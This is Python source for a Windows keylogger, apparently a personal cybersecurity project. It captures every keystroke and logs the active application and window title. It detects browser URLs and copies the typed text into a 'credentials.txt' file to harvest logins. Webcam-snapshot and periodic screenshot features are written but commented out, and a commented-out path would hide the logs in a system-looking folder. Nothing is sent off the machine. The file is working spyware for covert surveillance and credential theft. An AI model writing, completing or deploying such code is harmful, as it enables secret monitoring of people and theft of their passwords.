from Feature import (get_activeApp_Data,
                     Take_Screenshots,
                     take_snapshot,
                     url_detection,
                     login_detection)
from pynput.keyboard import Listener, Key
from datetime import datetime
from pathlib import Path
import threading
import time
import os
import re

def datetime_updater():
    while True:
        current_time = datetime.now().strftime("%I:%M_%p")
        current_date = datetime.now().strftime("%d-%B")
        time.sleep(1)
        return current_date,current_time
    
current_date, current_time = datetime_updater()
TIMESTAMP = f"{current_date} \n {current_time}"


# Main_dir = Path(f"C:/SYSTEM.SAV/Util/Syslog/Data_{current_date}")
Main_dir = Path(f"G:/Python/CyberSce_Project/Data_{current_date}")

keylogger_dir = os.path.join(Main_dir, f"Keylogs_{current_date}")
KEYLOG_FILE = os.path.join(keylogger_dir, "Keylogs.txt")

SNAPSHOTS_dir = os.path.join(Main_dir, "CamShots")

LOGIN_FILE = os.path.join(Main_dir, "Login")
cred_file = os.path.join(LOGIN_FILE, "credentials.txt")

EXIT_COMBO = {Key.cmd, Key.backspace}

SPECIAL_KEYS = {
    'enter': '\n',
    'space': ' ',
    'tab': '[TAB]',
    'backspace': '[BACKSPACE]',
    'esc': '[ESC]',
    'ctrl_l': '[CTRL]',
    'ctrl_r': '[CTRL]',
    'shift': '[SHIFT]',
    'shift_r': '[SHIFT]',
    'alt': '[ALT]',
    'alt_r': '[ALT]',
    'cmd': '[CMD]',
    'cmd_r': '[CMD]',
    'caps_lock': '[CAPS_LOCK]',
    'delete': '[DELETE]',
    'home': '[HOME]',
    'end': '[END]',
    'page_up': '[PAGE_UP]',
    'page_down': '[PAGE_DOWN]',
    'up': '[UP]',
    'down': '[DOWN]',
    'left': '[LEFT]',
    'right': '[RIGHT]',
    'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]', 'f4': '[F4]',
    'f5': '[F5]', 'f6': '[F6]', 'f7': '[F7]', 'f8': '[F8]',
    'f9': '[F9]', 'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]'
}
control_key_map = {
    '\x01': "Ctrl+A — Select all",
    '\x02': "Ctrl+B — Bold (in editors)",
    '\x03': "Ctrl+C — Copy / Interrupt",
    '\x04': "Ctrl+D — Logout / EOF",
    '\x05': "Ctrl+E — Move to end of line",
    '\x06': "Ctrl+F — Find",
    '\x07': "Ctrl+G — Bell / Beep",
    '\x08': "Ctrl+H — Backspace",
    '\x09': "Ctrl+I — Tab / Indent",
    '\x0A': "Ctrl+J — Newline (Line Feed)",
    '\x0B': "Ctrl+K — Cut to end of line",
    '\x0C': "Ctrl+L — Clear screen / terminal",
    '\x0D': "Ctrl+M — Enter / Return",
    '\x0E': "Ctrl+N — New document / line",
    '\x0F': "Ctrl+O — Open file",
    '\x10': "Ctrl+P — Print",
    '\x11': "Ctrl+Q — Resume (XON)",
    '\x12': "Ctrl+R — Reverse search",
    '\x13': "Ctrl+S — Save / Pause (XOFF)",
    '\x14': "Ctrl+T — Transpose characters",
    '\x15': "Ctrl+U — Delete line",
    '\x16': "Ctrl+V — Paste",
    '\x17': "Ctrl+W — Close tab / Delete word",
    '\x18': "Ctrl+X — Cut",
    '\x19': "Ctrl+Y — Redo / Yank",
    '\x1A': "Ctrl+Z — Undo / Suspend",
    '\x1B': "Escape — Cancel / Exit",
}
special_key_combo_map = {
    'alt+tab': "Switch window",
    'alt+f4': "Close application",
    'ctrl+alt+del': "System security / Task Manager",
    'win+l': "Lock screen",
    'win+d': "Show desktop",
    'shift+delete': "Permanent delete (bypass Recycle Bin)",
    'alt+enter': "Toggle fullscreen (in terminals / apps)",
    'ctrl+shift+esc': "Open Task Manager"
}

pressed_keys = set()
current_process = ""
file_lock = threading.Lock()
key_buffer = []

def file_handler():
    os.makedirs(Main_dir, exist_ok=True)
    print(f"[+] Created/Verified main dir: {Main_dir}")
    child_dirs = [
        keylogger_dir,
        SNAPSHOTS_dir,
        LOGIN_FILE
    ]
    for child in child_dirs:
        os.makedirs(child, exist_ok=True)
        print(f"[+] Created/Verified child dir: {child}")

def flush_buffer():
    global key_buffer
    if key_buffer:
        with file_lock:
            with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
                f.write("".join(key_buffer))
        key_buffer = []

def write_key(key_str):
    global key_buffer
    try:
        key_buffer.append(key_str)
        if len(key_buffer) >= 10:
            flush_buffer()
    except Exception as e:
        error_msg = f"[ERROR] {e}\n"
        print(error_msg)
        with file_lock:
            with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
                f.write(error_msg)
          
def process_key(key):
    key_str = str(key).replace("'", "")
    if isinstance(key, Key):
        key_name = key.name
        return SPECIAL_KEYS.get(key_name, f'[{key_name.upper()}]')
    if len(key_str) == 1:
        if (Key.shift in pressed_keys or Key.shift_r in pressed_keys or
            Key.caps_lock in pressed_keys) and key_str.isalpha():
            return key_str.upper()
        return key_str
    return f'[{key_str.upper()}]'

def on_press(key):
    pressed_keys.add(key)
    key_str = process_key(key)
    print(f"DEBUG: Captured key: {key_str}")

    write_key(key_str)

def on_release(key):
    if all(k in pressed_keys for k in EXIT_COMBO):
        print("Exiting Keylogger...")
        flush_buffer()
        return False
    if key in pressed_keys:
        pressed_keys.remove(key)

def cam_Shots():
    global current_time
    current = f"user_at_{current_time.replace(':', '-')}.png"
    os.makedirs(SNAPSHOTS_dir, exist_ok=True)
    snapshot_path = os.path.join(SNAPSHOTS_dir, f"{current}")
    print(f"Image saved successfully at {snapshot_path}")
    take_snapshot(snapshot_path)

def update_active_app():
    global current_process
    prev_process = None
    prev_title = None
    prev_url = None
    browser_list = ["chrome.exe", "firefox.exe", "msedge.exe", "safari.exe", "brave.exe", "opera.exe"]

    while True:
        try:
            hwnd, process_title, process_name = get_activeApp_Data()
            url = url_detection(hwnd, process_name)
            url = None
            if process_title.strip() != prev_title or process_name != prev_process:
                flush_buffer()
                current_process = f"\n\nProcess: {process_name} \nTitle: {process_title}"
                with file_lock:
                    with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
                        if process_title == "":
                            f.write("\n\nProcess: None \nTitle: No app running on foreground\n\n")
                            print("No app running on foreground\n\n")
                        else:
                            f.write((f"{current_process}\n{url}") if url else f"{current_process}")
                            print((f"{current_process}\n{url}") if url else f"{current_process}")
                prev_process = process_name
                prev_title = process_title
            if process_name in browser_list:
                url = url_detection(hwnd, process_name)
                if url and url != prev_url:
                    flush_buffer()
                    keystrokes = ""
                    with file_lock:
                        if os.path.exists(KEYLOG_FILE):
                            with open(KEYLOG_FILE, 'r', encoding='utf8') as kf:
                                keystrokes = kf.read().strip()
                    keystrokes = re.sub(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)(?!\n)', r'\1\n', keystrokes)
                    with file_lock:
                        with open(cred_file, 'a', encoding='utf8') as f:
                            url_log = (
                                f"\nProcess: {process_name}\n"
                                f"Title: {process_title}\n"
                                f"URL: {url}\n"
                                f"{keystrokes}\n"
                            )
                            f.write(url_log)
                            print(url_log)
                    prev_url = url
            time.sleep(1)
        except Exception as e:
            current_process = f"Error detecting app: {e}"
            print(f"Error in update_active_app: {e}")
            time.sleep(5)

def take_SS():
    screenshot_dir = Path(os.path.join(Main_dir, f"ScreenShot_{current_date}"))
    os.makedirs(screenshot_dir, exist_ok=True )
    while  True:
        ss_time = str(datetime.now().strftime("ss_%I_%M_%S_%p"))
        SCREENSHOTS = os.path.join(screenshot_dir, f"{ss_time}.jpeg")
        result = Take_Screenshots(SCREENSHOTS)
        print(result)
        time.sleep(30)
        # time.sleep(8)  #For Testing purposes

def main():
    try:
        once = True
        os.makedirs(keylogger_dir, exist_ok=True)
        print("=" * 20, "Starting Keylogger", f"{TIMESTAMP}", "=" * 20)
        '''
        if once != False:
            threading.Thread(target=cam_Shots, daemon=True).start()
            once = False
        threading.Thread(target=take_SS, daemon=True).start()
        '''
        threading.Thread(target=update_active_app, daemon=True).start()
        
        with file_lock:
            with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
                f.write("\n\n" + "-" * 60 + "\n")
                f.write(f"{TIMESTAMP}\n")
                f.write("-" * 60 )
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        error_msg = f"[ERROR] {e}\n"
        print(error_msg)
        with file_lock:
            with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
                f.write(error_msg)

if __name__ == "__main__":
    file_handler()
    main()

'''
alksdjsldfkkjvnkj smcsl;kdf
sdjfksalfjd
hii
hii friends testing keylogger for last time beore going for linkux
'''
